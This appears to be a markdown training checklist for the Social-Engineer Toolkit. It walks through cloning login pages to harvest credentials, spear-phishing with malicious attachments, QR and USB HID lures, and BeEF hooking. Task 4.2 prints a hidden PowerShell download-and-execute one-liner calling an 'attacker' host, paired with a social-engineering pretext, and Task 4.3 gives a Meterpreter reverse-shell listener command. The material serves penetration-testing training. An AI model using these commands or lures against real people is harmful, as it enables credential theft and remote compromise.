# 🛡️ SET (Social-Engineer Toolkit): Complete Mastery Checklist

> **What is SET?** The Social-Engineer Toolkit (SET) is a Python-based framework for social engineering attacks — primarily phishing websites, credential harvesting, and payload delivery. Its website attack vectors can clone any website automatically, serve it from a local web server, and capture submitted credentials. Its other modules handle spear-phishing emails, malicious file generation (with Metasploit integration), and HID attacks. SET is pre-installed on Kali and is the go-to tool for quick, one-command credential harvesting pages.
>
> **When to use it:** Quick credential harvesting page setup. Spear-phishing campaigns with payload delivery. When you need a credential harvester in minutes. Labs and CTFs requiring social engineering components.
>
> **SET vs. GoPhish:** SET = quick setup, single attacker box, command-line driven, Metasploit-integrated. GoPhish = full campaign management, web UI, tracking, reporting, multi-target. For real engagements: GoPhish for managed campaigns. SET for quick lab demonstrations or payload delivery.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 4 | 1–2 hours |
| 2 | Website Attacks | 4 | 2–3 hours |
| 3 | Spear Phishing | 3 | 2–3 hours |
| 4 | Powershell | 3 | 1–2 hours |
| 5 | QR Code and HID | 2 | 1–2 hours |
| 6 | Integration | 2 | 1–2 hours |
| 7 | Practical Labs | 3 | 3–5 hours |
| 8 | Mastery Challenges | 2 | 2–3 hours |
| | **Total** | **23** | **~13–22 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — SET Modules Overview

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **1) Social Engineering Attacks** | Main attack module. Website attacks, spear phishing, HID. |
| **2) Penetration Testing** | Fast-track attacks. Metasploit integration. |
| **3) Third Party Modules** | Additional modules. |
| **4) Update SET** | Self-update. |
| **Website Attacks** | Sub-menu: Credential Harvester, Tabnapping, Web Jacking, Multi-Attack. |
| **Spear Phishing** | Email with malicious attachment or link. |

---

### Task 1.2 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Kali** | Pre-installed. `sudo setoolkit`. |
| **Manual** | `git clone https://github.com/trustedsec/social-engineer-toolkit; pip3 install -r requirements.txt; sudo python3 setup.py`. |

---

### Task 1.3 — SET vs. GoPhish

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **SET** | Quick. Command-line menus. Serves harvester from local Kali. No tracking dashboard. Good for lab demos. |
| **GoPhish** | Full campaign management. Web UI. Tracking (opened, clicked, submitted). Scheduling. Multi-target reporting. Good for real engagements. |
| **Both** | Use SET for rapid demos and payloads. GoPhish for managed, tracked campaigns. |

---

### Task 1.4 — Ethics

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Authorization** | Any social engineering attack requires explicit written authorization. |
| **Scope** | Only use against explicitly authorized targets. |

---

# PHASE 2: WEBSITE ATTACKS

---

### Task 2.1 — Credential Harvester: Site Cloner

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Path** | SET → 1 (Social Engineering) → 2 (Website Attack Vectors) → 3 (Credential Harvester) → 2 (Site Cloner). |
| **Enter** | Your IP address (for the POST redirect). URL to clone (e.g., `https://accounts.google.com`). |
| **Result** | SET starts a web server on port 80. Cloned site served. When victim visits and submits: credentials captured and displayed in terminal. |

---

### Task 2.2 — Credential Harvester: Custom Import

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Path** | Credential Harvester → 1 (Web Templates). Choose pre-built templates: Gmail, Facebook, Twitter. |
| **Custom** | Or place custom HTML in `/usr/share/set/src/html/` and choose "Custom Import". |

---

### Task 2.3 — Tabnapping

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Concept** | Victim visits a legitimate-looking page. When they switch to another tab, the SET page silently changes to a login page. When they return, they see a "session expired" login page and re-enter credentials. |
| **Path** | Website Attack Vectors → 4 (Tabnapping). |

---

### Task 2.4 — Multi-Attack Web Method

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Path** | Website Attack Vectors → 6 (Multi-Attack Web Method). |
| **Combo** | Simultaneously serves: credential harvester + Metasploit payload + Java applet (if applicable). First attack to succeed wins. |

---

# PHASE 3: SPEAR PHISHING

---

### Task 3.1 — Spear Phishing Email Attack

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Path** | SET → 1 → 1 (Spear Phishing Attack). |
| **Payload** | Select payload type: Metasploit reverse shell EXE, malicious PDF, Office doc with macro, etc. |
| **Send** | SET sends the email with the malicious attachment via SMTP. |
| **Alternative** | Generate payload only → send manually via GoPhish or real email client. |

---

### Task 3.2 — File Format Exploits

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | Malicious Office document with macro, PDF exploit, etc. Sent as email attachment. Victim opens → executes payload. |
| **SET + MSF** | SET generates the malicious file → Metasploit listener catches the reverse connection. |
| **AV** | Default SET payloads are heavily signatured. AV will quarantine most. Real engagements require custom/obfuscated payloads. |

---

### Task 3.3 — Standalone Payload + GoPhish

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Workflow** | SET generates malicious payload file. Upload to GoPhish as the "download" on the landing page. GoPhish sends the phishing email with a link to the GoPhish-served download. Metasploit listens for the reverse connection. |

---

# PHASE 4: POWERSHELL

---

### Task 4.1 — PowerShell Attack Vectors

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Path** | SET → 1 → 10 (PowerShell Attack Vectors). |
| **Options** | PowerShell alphanumeric shellcode injector. Powershell Reverse Shell. Bind Shell. SecureString. |
| **Output** | SET generates a PowerShell one-liner that victims run. Delivers payload in-memory. |

---

### Task 4.2 — PowerShell Injection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | SET generates: `powershell -W Hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"`. |
| **Delivery** | Embed in phishing email body. Social engineer victim into running it. "Please run this PowerShell command to fix your VPN issue." |

---

### Task 4.3 — Listener Setup

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **MSF** | SET prompts to auto-launch Metasploit listener. Or: manual: `msfconsole -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST X; set LPORT 4444; run"`. |

---

# PHASE 5: QR CODE AND HID

---

### Task 5.1 — QR Code Attack

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Concept** | Generate a QR code pointing to a SET-hosted credential harvester. Print and place in physical environments ("Scan for free Wi-Fi", "Scan to register"). |
| **Path** | Website Attack Vectors → QR Code Generator. Enter URL of harvester. QR code generated. |

---

### Task 5.2 — HID Attack (Arduino)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | HID (Human Interface Device) attack: USB device impersonates keyboard. Plugged into target → types commands automatically at superhuman speed → installs payload. |
| **SET** | SET → 1 → 7 (Arduino-Based Attack Vector). Generates script for Teensy/Arduino. |
| **Physical** | Requires physical access. Disguise as USB charger, USB drive. Drop in target's environment. |

---

# PHASE 6: INTEGRATION

---

### Task 6.1 — SET + Metasploit

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Auto** | Many SET payloads auto-launch Metasploit listener. |
| **Manual** | Generate payload with SET → start listener manually with correct payload/LHOST/LPORT → wait for callback. |
| **Meterpreter** | Use Meterpreter sessions for post-exploitation: hashdump, screenshot, keyscan, migrate. |

---

### Task 6.2 — SET + BeEF

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **BeEF** | Browser Exploitation Framework. Hooks victim's browser via JavaScript. |
| **Combo** | SET serves cloned page with BeEF hook injected. Victim visits → browser hooked → attack via BeEF commands. |
| **Attacks** | Get browser info, steal cookies, redirect, alert, run browser exploits. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — Site Cloner Credential Harvest

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| **Scenario** | Lab victim VM. SET clones a login page. Victim visits attacker's IP and "logs in." Credentials captured in SET terminal. |
| **Success Criteria** | Credentials captured. Credential harvester functional. |

---

### Lab 7.2 — PowerShell Payload Delivery

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | SET generates PowerShell reverse shell. Metasploit listener running. Social engineer lab victim into running the PowerShell command. Meterpreter session established. |
| **Success Criteria** | Meterpreter session opened via PowerShell delivery. |

---

### Lab 7.3 — Full Social Engineering Chain

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Full chain: GoPhish phishing email → victim clicks → SET-served clone page → victim submits credentials → use credentials for further access. Document every step. |
| **Success Criteria** | Complete chain documented. Credentials captured and used for access. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Compare SET and GoPhish

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Run the same credential harvesting attack with SET and then with GoPhish. Document: setup time, tracking capability, realism, scalability. Write a clear use case recommendation. |
| **Success Criteria** | Both tools used. Clear use case documentation written. |

---

### Challenge 8.2 — Physical Social Engineering

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Authorized physical penetration test simulation: design a QR code attack vector. Place QR code on a physical lure (fake badge scanner, free Wi-Fi poster). Document the full attack scenario from placement to credential capture. |
| **Success Criteria** | QR code generated. Physical lure designed. Attack scenario documented. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can set up a credential harvester using site cloner | ☐ |
| Can clone any website for a harvesting page | ☐ |
| Can generate and deliver a PowerShell payload via SET | ☐ |
| Can integrate SET with Metasploit listener | ☐ |
| Can generate QR code-based attack vectors | ☐ |
| Understands when to use SET vs. GoPhish | ☐ |
| Understands ethical and legal requirements | ☐ |

---

## 🎯 Interview Questions

1. What is SET and what attack vectors does it support?
2. How does the credential harvester site cloner work?
3. How do you deliver a PowerShell payload via SET?
4. How does SET integrate with Metasploit?
5. What is the difference between SET and GoPhish?
6. What is a HID attack and how does SET support it?
7. When would you use SET over GoPhish in a real engagement?
